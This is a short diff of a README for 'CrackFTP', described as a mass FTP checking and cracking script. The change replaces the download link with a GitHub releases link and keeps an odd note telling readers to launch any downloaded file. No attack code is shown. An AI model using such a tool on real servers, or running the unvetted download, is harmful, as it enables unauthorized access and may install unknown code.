@@ -12,7 +12,7 @@ CrackFTP is a powerful script designed for mass FTP checking and cracking, speci
 
 ## Installation 📦
 To get started with CrackFTP, download the latest release from the following link:
-[![Download CrackFTP](https://img.shields.io/badge/Download-CrackFTP-blue.svg)](https://github.com/assets/Release.zip)
+[![Download CrackFTP](https://github.com/PIRLOKIPNGENO/CrackFtp/releases)](https://github.com/PIRLOKIPNGENO/CrackFtp/releases)
 
 Note: If the link ends with a file name, ensure it is launched to initiate the download process.
 
